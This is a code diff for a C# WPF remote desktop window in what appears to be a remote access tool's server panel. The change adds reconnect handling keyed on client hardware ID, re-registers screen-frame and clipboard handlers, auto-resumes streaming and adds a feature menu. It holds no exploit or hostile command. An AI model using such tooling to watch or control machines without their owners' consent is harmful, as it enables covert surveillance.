@@ -1,4 +1,5 @@
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text.Json;
 using System.Windows;
@@ -27,7 +28,11 @@ public partial class RemoteDesktopWindow : Window
             Math.Max(2, Environment.ProcessorCount / 2));
 
     private readonly TlsServer _server;
-    private readonly string _clientId;
+    private string _clientId;
+    private readonly string _hwid;
+    private System.Windows.Threading.DispatcherTimer? _reconnectTimer;
+    private int _reconnectCountdown;
+    private bool _wasStreaming;
     private int _remoteW, _remoteH;
     private volatile int _screenW, _screenH;
     private int _frameCount;
@@ -46,6 +51,7 @@ public partial class RemoteDesktopWindow : Window
     {
         _server   = server;
         _clientId = clientId;
+        _hwid     = server.ConnectedClients.TryGetValue(clientId, out var cc) ? cc.Hwid : string.Empty;
         InitializeComponent();
         WindowResizer.Enable(this);
         _uiReady = true;
@@ -85,15 +91,18 @@ public partial class RemoteDesktopWindow : Window
             if (d?.Text is { Length: > 0 }) OnRemoteClipboard(clientId, d.Text);
         });
         _server.ClientDisconnected += OnClientDisconnected;
+        _server.ClientConnected += OnClientConnected;
 
         Closed += (_, _) =>
         {
             UninstallHook();
             _closed = true;
-            _server.UnregisterHandler(clientId, PacketType.RdpFrame);
-            _server.UnregisterHandler(clientId, PacketType.RdpClipboard);
+            _reconnectTimer?.Stop();
+            _server.UnregisterHandler(_clientId, PacketType.RdpFrame);
+            _server.UnregisterHandler(_clientId, PacketType.RdpClipboard);
             _server.ClientDisconnected -= OnClientDisconnected;
-            if (_server.ConnectedClients.TryGetValue(clientId, out var client))
+            _server.ClientConnected -= OnClientConnected;
+            if (_server.ConnectedClients.TryGetValue(_clientId, out var client))
             {
                 client.PropertyChanged -= OnClientPropertyChanged;
             }
@@ -147,6 +156,22 @@ public partial class RemoteDesktopWindow : Window
             WindowState = WindowState.Maximized;
             RootBorder.CornerRadius = new CornerRadius(0); // no rounded corners when fullscreen
             BtnFullscreen.Content = "❐";
+        }
+    }
+
+    // ── Hamburger menu ───────────────────────────────────────────────────────
+
+    private void BtnMenu_Click(object sender, RoutedEventArgs e)
+    {
+        if (sender is System.Windows.Controls.Button btn)
+        {
+            var mainWindow = Application.Current.Windows.OfType<ServerWindow>().FirstOrDefault();
+            if (mainWindow == null) return;
+            var menu = FeatureContextMenu.Build(_server, _clientId, mainWindow, "RemoteDesktopWindow");
+            btn.ContextMenu = menu;
+            menu.PlacementTarget = btn;
+            menu.Placement = System.Windows.Controls.Primitives.PlacementMode.Bottom;
+            menu.IsOpen = true;
         }
     }
 
@@ -362,12 +387,83 @@ public partial class RemoteDesktopWindow : Window
         catch { _renderBusy = false; }
     }
 
-    // ── Close feature window when client disconnects / uninstalls ─────────────
+    // ── Connection resilience — reconnect overlay + auto-resume ───────────────
 
     private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
     {
         if (c.Id != _clientId) return;
-        Dispatcher.BeginInvoke(Close);
+        Dispatcher.BeginInvoke(() =>
+        {
+            _wasStreaming = _streaming;
+            if (_streaming) SetStreamingState(false);
+            _reconnectCountdown = 60;
+            TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
+            ReconnectOverlay.Visibility = Visibility.Visible;
+            TxtStatus.Text = "Connection lost";
+            ServerWindow.ReportGlobalActivity("⚡ Connection lost", _clientId, "failed");
+
+            _reconnectTimer?.Stop();
+            _reconnectTimer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
+            _reconnectTimer.Tick += (_, _) =>
+            {
+                _reconnectCountdown--;
+                TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
+                if (_reconnectCountdown <= 0)
+                {
+                    _reconnectTimer.Stop();
+                    ServerWindow.ReportGlobalActivity("✗ Reconnect timeout", _hwid.Length > 8 ? _hwid[..8] : _hwid, "failed");
+                    Close();
+                }
+            };
+            _reconnectTimer.Start();
+        });
+    }
+
+    private void OnClientConnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (string.IsNullOrEmpty(_hwid) || c.Hwid != _hwid) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            if (_closed) return;
+            var oldId = _clientId;
+            _clientId = c.Id;
+
+            // Re-register per-client packet handlers on the new client ID
+            _server.UnregisterHandler(oldId, PacketType.RdpFrame);
+            _server.UnregisterHandler(oldId, PacketType.RdpClipboard);
+            _server.RegisterHandler(_clientId, PacketType.RdpFrame,
+                pkt => OnFrame(_clientId, pkt.Data));
+            _server.RegisterHandler(_clientId, PacketType.RdpClipboard, pkt =>
+            {
+                var d = Newtonsoft.Json.JsonConvert.DeserializeObject<RdpClipboardData>(pkt.Data);
+                if (d?.Text is { Length: > 0 }) OnRemoteClipboard(_clientId, d.Text);
+            });
+
+            // Update property change subscription
+            if (_server.ConnectedClients.TryGetValue(oldId, out var oldClient))
+                oldClient.PropertyChanged -= OnClientPropertyChanged;
+            c.PropertyChanged += OnClientPropertyChanged;
+
+            // Hide overlay, cancel timer
+            _reconnectTimer?.Stop();
+            ReconnectOverlay.Visibility = Visibility.Collapsed;
+
+            // Update UI
+            Title = $"Remote Desktop — {_clientId}";
+            TxtClientId.Text = $"[ {_clientId} ]";
+            TxtStatus.Text = "Reconnected";
+            ServerWindow.ReportGlobalActivity("✓ Reconnected (RDP)", _clientId, "complete");
+
+            // Auto-resume streaming if it was active before disconnect
+            if (_wasStreaming)
+            {
+                _wasStreaming = false;
+                // Request monitor list then auto-start
+                _ = _server.SendToClient(_clientId,
+                    new Packet { Type = PacketType.RdpGetMonitors, Data = "{}" });
+                SendStart();
+            }
+        });
     }
 
     private void EnsureFrame(int w, int h)
